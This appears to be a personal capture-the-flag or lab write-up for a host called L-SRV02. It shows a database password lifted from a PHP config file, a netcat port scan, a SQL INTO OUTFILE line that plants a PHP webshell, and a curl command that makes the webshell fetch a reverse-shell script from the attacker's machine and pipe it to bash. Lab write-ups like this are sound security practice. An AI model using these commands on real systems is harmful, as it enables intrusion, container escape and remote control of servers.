## L-SRV02
IP: 192.168.100.100
* * *
## Internal Enumeration
Checking php file configs we found some info about a DB:
`www-data@c6f30eee4855:/var/www/admin$ cat db
cat db_connect.php
<?php

define('DB_SRV', '192.168.100.1');
define('DB_PASSWD', "!123SecureAdminDashboard321!");
define('DB_USER', 'admin');
define('DB_NAME', 'DashboardDB');

$connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);

if($connection == false){

        die("Error: Connection to Database could not be made." . mysqli_connect_error());
}
?>`

Checking oper ports with NC shows some services
www-data@c6f30eee4855:/tmp$ nc -zv 192.168.100.1 1-65533
192.168.100.1: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.100.1] 33060 (?) open
(UNKNOWN) [192.168.100.1] 8080 (http-alt) open
(UNKNOWN) [192.168.100.1] 3306 (mysql) open
(UNKNOWN) [192.168.100.1] 80 (http) open
(UNKNOWN) [192.168.100.1] 22 (ssh) open

Logging into DB with credentials found from db_connet.php we get some users:
![a20957505adf87e16f3b53a073d2d766.png](../../../_resources/a20957505adf87e16f3b53a073d2d766.png)

Now we can inject a malicious php webshell into L-SRV01 so we can escape the container by:
1. Logging into DB on L-SRV01
2. Creating a file that have a php code of a webshell, so we can reach in port 8080 on the mainhost ad escape docker: select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell2.php';
3. curl 192.168.100.1:8080/shell2.php?cmd=something

For some reasons i can't get a Revshell on L-SRV01 with a oneliner Busybox so letäs follow the walkthrough and create a bash script that will use a Bash TCP reverse shell from PayloadAllTheThings
Spin up a python http server and curl in on the machine, and we should be able to get a Revshell on the new Netcat.
`
curl 192.168.100.1:8080/shell2.php?cmd=curl%20http://10.50.108.156:9000/revsh.sh%7Cbash%20%26`

And we get the second flag:
![59dcb3269369ba4ab5ef8b0a74bc1cd3.png](../../../_resources/59dcb3269369ba4ab5ef8b0a74bc1cd3.png)

Now we have done everithing here, moving back to L-SRV01.

* * *